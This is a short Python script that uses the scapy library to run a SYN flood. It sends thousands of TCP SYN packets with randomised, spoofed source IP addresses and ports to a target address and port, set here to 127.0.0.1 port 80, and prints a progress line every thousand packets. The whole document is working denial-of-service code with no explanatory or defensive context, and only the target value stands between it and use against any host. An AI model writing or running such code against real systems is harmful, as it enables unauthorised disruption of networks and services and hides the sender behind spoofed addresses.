from scapy.all import *
import time

target_ip = "127.0.0.1"
target_port = 80

def send_syn_flood(target_ip, target_port, count=5000):
    for i in range(count):
        ip_layer = IP(src=RandIP(), dst=target_ip)
        tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
        pkt = ip_layer / tcp_layer
        send(pkt, verbose=False)
        if i % 1000 == 0:
            print(f"Sent {i} SYN packets...")

send_syn_flood(target_ip, target_port)